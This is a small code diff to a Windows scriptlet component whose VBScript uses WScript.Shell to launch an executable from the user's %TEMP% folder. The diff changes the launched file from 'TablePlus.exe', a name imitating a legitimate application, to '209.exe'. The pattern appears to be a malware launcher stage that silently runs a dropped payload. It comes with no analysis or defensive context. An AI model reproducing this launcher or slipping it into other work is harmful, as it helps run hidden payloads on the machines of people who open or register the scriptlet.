@@ -1,6 +1,6 @@
 <component>
 <script language="VBScript">
 Set shell=CreateObject("wscript.shell")
-shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\TablePlus.exe")
+shell.Run(shell.ExpandEnvironmentStrings("%TEMP%") & "\209.exe")
 </script>
 </component>
